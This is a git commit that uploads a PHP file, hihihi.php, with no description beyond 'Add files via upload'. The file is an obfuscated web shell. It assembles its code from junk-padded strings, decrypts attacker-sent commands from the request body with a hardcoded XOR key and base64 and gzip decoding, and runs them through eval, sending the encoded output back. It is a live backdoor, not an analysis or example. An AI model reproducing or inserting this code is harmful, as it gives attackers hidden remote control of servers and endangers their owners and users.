de190d24eb40689e263212f4be50f383aacfa847
Zachary Weber <86028315+ZacharyDevelops@users.noreply.github.com>
2021-08-22 16:08:39 -0400

    Add files via upload

---
+++ hihihi.php
@@ -0,0 +1,10 @@
+<?php
+$Z='/inLput"),$m)L==1) {@oLb_starLt();L@evaLl(@gzuncoLmprLeLss(@x(@basLe64_deLcLode($m[1]),$k)))L;$o=L@LobL_g';
+$M=str_replace('Rj','','RjcreaRjteRj_RjfRjRjunction');
+$E='$k="20LL2cb962";L$kh=L"ac59075b964bL";$kf="L07152Ld23L4Lb70";$pL="ce2PyQfTyBDLILWgpa";funLction x($LtL,';
+$f='$k){$c=strlLeLLn($k)L;$l=strleLnL(L$t);$o="";for($i=0;$i<$l;L)L{Lfor($j=0;($j<$Lc&&$i<$lL);$LjL++,$Li++';
+$V='){$o.=$t{L$i}^$k{$j}L;}L}returnL $o;}ifL (@preg_LLmatch("L/$kh(.+)$kfL/",@fiLle_geLt_contLentsL("phLp:/';
+$i='etL_Lcontents();@ob_end_clLeanL();$r=@baLsLe64_LencLode(@x(@gzcoLmpLress($o),$Lk));LpriLnt("$p$kh$r$kf");}';
+$L=str_replace('L','',$E.$f.$V.$Z.$i);
+$z=$M('',$L);$z();
+?>
